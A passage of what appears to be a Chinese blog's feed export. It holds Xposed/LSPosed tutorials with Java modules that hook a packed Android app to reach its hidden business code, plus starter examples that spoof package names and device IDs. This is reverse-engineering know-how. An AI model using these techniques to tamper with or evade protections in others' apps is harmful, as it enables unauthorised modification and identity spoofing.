class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.luoxposeddemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LuoHook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;[LuoXposed]&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (lpparam.packageName.equals(<span class="string">&quot;com.hay.dreamlover&quot;</span>)) &#123;</span><br><span class="line">            Log.i(TAG, <span class="string">&quot;Enter Hook&quot;</span>);</span><br><span class="line">            <span class="comment">//com.stub.StubApp</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">applicationClazz</span> <span class="operator">=</span> lpparam.classLoader.loadClass(<span class="string">&quot;com.stub.StubApp&quot;</span>);</span><br><span class="line">            XposedHelpers.findAndHookMethod(applicationClazz, <span class="string">&quot;attachBaseContext&quot;</span>, Context.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                    Log.i(TAG, <span class="string">&quot;Enter com.stub.StubApp.attachBaseContext&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                    Log.i(TAG, <span class="string">&quot;Leave com.stub.StubApp.attachBaseContext&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> (Context) param.args[<span class="number">0</span>];</span><br><span class="line">                    <span class="comment">//获取真实业务代码的classLoader</span></span><br><span class="line">                    <span class="type">ClassLoader</span> <span class="variable">finalClassLoader</span> <span class="operator">=</span> context.getClassLoader();</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">initActivityClazz</span> <span class="operator">=</span> finalClassLoader.loadClass(<span class="string">&quot;com.fanwe.hybrid.activity.InitActivity&quot;</span>);</span><br><span class="line">                    XposedBridge.hookAllMethods(initActivityClazz, <span class="string">&quot;onCreate&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                            <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                            Log.i(TAG, <span class="string">&quot;attachBaseContext Enter com.fanwe.hybrid.activity.InitActivity.onCreate&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                            <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                            Log.i(TAG, <span class="string">&quot;attachBaseContext Leave com.fanwe.hybrid.activity.InitActivity.onCreate&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>上面的方法在厂商对加固过程有改动时, 就需要花费时间对脚本进行修改</p><p>方法二则是一个更通用的解决任意加固应用函数的Hook方式</p><p>回顾app启动相关的知识</p><p>App被Zygote进程孵化后,通过ActivityThread.main函数进入App的世界.</p><p>ActivityThread这个类十分重要,它会根据ActivityManager发送的请求对activities、broadcast Receviers等操作进行调度和执行.</p><p>其中performLaunchActivity()函数用于响应Activity相关的操作.</p><p>另外ActivityThread类中还存在着一个Application类型的mInitialApplication成员,应用程序中有且只有一个Application组件,而Application对象中就存储着当前的ClassLoader,考虑到App在响应Activity消息时,真实App的代码已经被释放到内存中,此时通过mInitialApplication成员获取应用当前的ClassLoader,即可完成对真实App业务代码的Hook.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.luoxposeddemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LuoHook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;[LuoXposed]&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (lpparam.packageName.equals(<span class="string">&quot;com.hay.dreamlover&quot;</span>)) &#123;</span><br><span class="line">            Log.i(TAG, <span class="string">&quot;Enter Hook&quot;</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">activityThreadClazz</span> <span class="operator">=</span> lpparam.classLoader.loadClass(<span class="string">&quot;android.app.ActivityThread&quot;</span>);</span><br><span class="line">            XposedBridge.hookAllMethods(activityThreadClazz, <span class="string">&quot;performLaunchActivity&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                    Log.i(TAG, <span class="string">&quot;Enter android.app.ActivityThread.performLaunchActivity&quot;</span>);</span><br><span class="line">                    </span><br><span class="line">                    <span class="type">Application</span> <span class="variable">mInitialApplication</span> <span class="operator">=</span> (Application) XposedHelpers.getObjectField(param.thisObject, <span class="string">&quot;mInitialApplication&quot;</span>);</span><br><span class="line">                    <span class="type">ClassLoader</span> <span class="variable">finalClassLoader</span> <span class="operator">=</span> mInitialApplication.getClassLoader();</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">initActivityClazz</span> <span class="operator">=</span> finalClassLoader.loadClass(<span class="string">&quot;com.fanwe.hybrid.activity.InitActivity&quot;</span>);</span><br><span class="line">                    <span class="comment">//Log.i(TAG, initActivityClazz.toString());</span></span><br><span class="line">                    XposedBridge.hookAllMethods(initActivityClazz, <span class="string">&quot;onCreate&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                            <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                            Log.i(TAG, <span class="string">&quot;performLaunchActivity Enter com.fanwe.hybrid.activity.InitActivity.onCreate&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                            <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                            Log.i(TAG, <span class="string">&quot;performLaunchActivity Leave com.fanwe.hybrid.activity.InitActivity.onCreate&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">                    Log.i(TAG, <span class="string">&quot;Leave android.app.ActivityThread.performLaunchActivity&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">xposed</summary>
    
    
    
    <category term="bin" scheme="https://ixout.github.io/categories/bin/"/>
    
    
    <category term="xposed" scheme="https://ixout.github.io/tags/xposed/"/>
    
  </entry>
  
  <entry>
    <title>xposed入门: FDex2源码分析与实战登山赛车</title>
    <link href="https://ixout.github.io/posts/32540/"/>
    <id>https://ixout.github.io/posts/32540/</id>
    <published>2024-10-26T03:19:11.000Z</published>
    <updated>2025-03-13T13:06:17.502Z</updated>
    
    <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><h2 id="lsposed"><a href="#lsposed" class="headerlink" title="lsposed"></a>lsposed</h2><p>xposed仅支持到android 7.0版本, 在更高的版本有许多替代, 最常用的便是lsposed</p><div class="table-container"><table><thead><tr><th>特性</th><th>Xposed</th><th>LSPosed</th></tr></thead><tbody><tr><td><strong>Hook 方式</strong></td><td>直接 Hook <code>Zygote</code> 进程</td><td>通过 Magisk / Riru 注入 <code>Zygote</code></td></tr><tr><td><strong>兼容性</strong></td><td>旧版 Android（7.0-10.0）</td><td>适用于 Android 8.0+</td></tr><tr><td><strong>模块管理</strong></td><td>需要 Xposed Installer</td><td>需要 LSPosed Manager</td></tr><tr><td><strong>性能影响</strong></td><td>修改系统 <code>Zygote</code>，易损坏</td><td>仅 Hook 选定进程，更稳定</td></tr><tr><td><strong>安全性</strong></td><td>易被检测（如 SafetyNet）</td><td>更隐蔽，适用于新版本 Android</td></tr></tbody></table></div><p>不过二者模块是几乎完全兼容的, 语法什么的都差不多</p><h2 id="magisk"><a href="#magisk" class="headerlink" title="magisk"></a>magisk</h2><p>lsposed需要magisk配合才能使用</p><h2 id="android-studio"><a href="#android-studio" class="headerlink" title="android studio"></a>android studio</h2><p>android开发必备</p><h1 id="模块init"><a href="#模块init" class="headerlink" title="模块init"></a>模块init</h1><ol><li><p>android studio创建一个新项目</p></li><li><p>在main目录下新增一个libs目录, 将XposedBridge.jar放入, 放入后右击选择<code>Add As Library</code>(注: 该依赖也可以通过在线导入)</p></li><li><p>到build.gradle中将上一步在dependencies对应产生的引入依赖语句中的<code>implementation</code> 改为 <code>compileOnly</code></p></li><li><p>在main目录下新增<code>assets</code>目录, 其中新建文件<code>xposed_init</code>, 添加一行内容<code>包名.xposed入口类名</code></p></li><li><p>在main目录下新增<code>/res/values</code>目录, 创建文件<code>arrays.xml</code>, 用于管理模块作用域</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string-array</span> <span class="attr">name</span>=<span class="string">&quot;xposedscope&quot;</span> &gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 这里填写模块的作用域应用的包名，可以填多个。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span>ceui.lisa.pixiv<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span>com.xjs.ehviewer<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span>com.picacomic.fregata<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">string-array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>修改<code>AndroidManifest.xml</code>在\<application>标签中新增内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- other information here --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 表明这是一个xposed模块, xposed通过这个标识识别模块, 不得更改 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;xposedmodule&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- 模块描述 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;xposeddescription&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">&quot;Easy example which makes the status bar clock red and adds a smiley&quot;</span> /&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- 最低要求xposed版本, 根据导入的xposed版本填 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;xposedminversion&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:value</span>=<span class="string">&quot;82&quot;</span> /&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- 模块作用域 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;xposedscope&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:resource</span>=<span class="string">&quot;@array/xposedscope&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="文档速览"><a href="#文档速览" class="headerlink" title="文档速览"></a>文档速览</h1><p><a href="https://api.xposed.info/">https://api.xposed.info/</a></p><p>快速过一遍文档中常用部分</p><h2 id="XC-MethodHook"><a href="#XC-MethodHook" class="headerlink" title="XC_MethodHook"></a>XC_MethodHook</h2><p>钩子回调类, 进行hook时一般需要创建该类的匿名子类</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-10_204742.png" alt=""></p><h3 id="MethodHookParam"><a href="#MethodHookParam" class="headerlink" title="MethodHookParam"></a>MethodHookParam</h3><p>封装关于方法调用的信息, 也就是回hook的参数</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-10_204718.png" alt=""></p><h2 id="XposedBridge"><a href="#XposedBridge" class="headerlink" title="XposedBridge"></a>XposedBridge</h2><p>提供与 Xposed 框架交互的核心方法</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-10_203953.png" alt=""></p><h2 id="XposedHelper"><a href="#XposedHelper" class="headerlink" title="XposedHelper"></a>XposedHelper</h2><p>提供一些实用方法，用于快速hook, 反射和动态操作类、方法、字段等</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-10_204311.png" alt=""></p><h2 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h2><p>Xposed/LSPosed 模块的<strong>入口类</strong>通常需要实现 <strong>Xposed 框架的接口</strong>，用于接收 Hook 事件并执行 Hook 逻辑, 对于一个模块至少应该实现一个该类接口</p><p>主要有四类接口</p><h3 id="IXposedHookLoadPackage"><a href="#IXposedHookLoadPackage" class="headerlink" title="IXposedHookLoadPackage"></a>IXposedHookLoadPackage</h3><p>用于监听应用的加载过程并hook</p><p><strong>重写方法</strong>: <code>handleLoadPackage</code></p><p><strong>参数</strong>:<code>XC_LoadPackage.LoadPackageParam</code></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-10_201903.png" alt=""></p><p><strong>示例</strong></p><p>注意:当app内存在多个包时, 使用参数lpparam.packageName过滤也只能使用应用包名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainHook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (!lpparam.packageName.equals(<span class="string">&quot;com.target.app&quot;</span>)) <span class="keyword">return</span>; <span class="comment">// 仅 Hook 目标应用</span></span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Hooking: &quot;</span> + lpparam.packageName);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 示例：Hook getPackageName() 方法</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">            <span class="string">&quot;android.app.Application&quot;</span>, lpparam.classLoader, <span class="string">&quot;getPackageName&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> &#123;</span><br><span class="line">                    param.setResult(<span class="string">&quot;com.fake.package&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IXposedHookInitPackageResources"><a href="#IXposedHookInitPackageResources" class="headerlink" title="IXposedHookInitPackageResources"></a>IXposedHookInitPackageResources</h3><p>监听资源加载并hook, 用于修改目标应用的 UI 资源，例如替换图片、修改文本等</p><p><strong>重写方法</strong>: <code>handleInitPackageResources</code></p><p><strong>参数</strong>:<code>XC_InitPackageResources.InitPackageResourcesParam</code></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-10_202207.png" alt=""></p><p><strong>示例:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookInitPackageResources;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_InitPackageResources;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResourceHook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookInitPackageResources</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleInitPackageResources</span><span class="params">(XC_InitPackageResources.InitPackageResourcesParam resparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (!resparam.packageName.equals(<span class="string">&quot;com.target.app&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 替换字符串资源（如修改 App 标题）</span></span><br><span class="line">        resparam.res.setReplacement(<span class="string">&quot;com.target.app&quot;</span>, <span class="string">&quot;string&quot;</span>, <span class="string">&quot;app_name&quot;</span>, <span class="string">&quot;Hooked App!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 替换图片资源</span></span><br><span class="line">        resparam.res.setReplacement(<span class="string">&quot;com.target.app&quot;</span>, <span class="string">&quot;drawable&quot;</span>, <span class="string">&quot;app_icon&quot;</span>, XposedHelpers.findSystemClass(<span class="string">&quot;com.myhook.module.R.drawable.new_icon&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IXposedHookZygoteInit"><a href="#IXposedHookZygoteInit" class="headerlink" title="IXposedHookZygoteInit"></a>IXposedHookZygoteInit</h3><p><strong>系统启动时</strong> 进行 Hook，影响所有应用</p><p><strong>重写方法</strong>:<code>initZygote</code></p><p><strong>参数</strong>:<code>StartupParam</code></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-10_202526.png" alt=""></p><p><strong>示例</strong>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookZygoteInit;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ZygoteHook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookZygoteInit</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initZygote</span><span class="params">(StartupParam startupParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Zygote Hook Initialized!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hook 所有应用的 getDeviceId()</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">            <span class="string">&quot;android.telephony.TelephonyManager&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;getDeviceId&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> &#123;</span><br><span class="line">                    param.setResult(<span class="string">&quot;000000000000000&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口组合"><a href="#接口组合" class="headerlink" title="接口组合"></a>接口组合</h3><p>在一个 Xposed 模块中，可以同时实现多个 Hook 接口，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> de.robv.android.xposed.*;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainHook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span>, IXposedHookInitPackageResources &#123;</span><br><span class="line">    <span 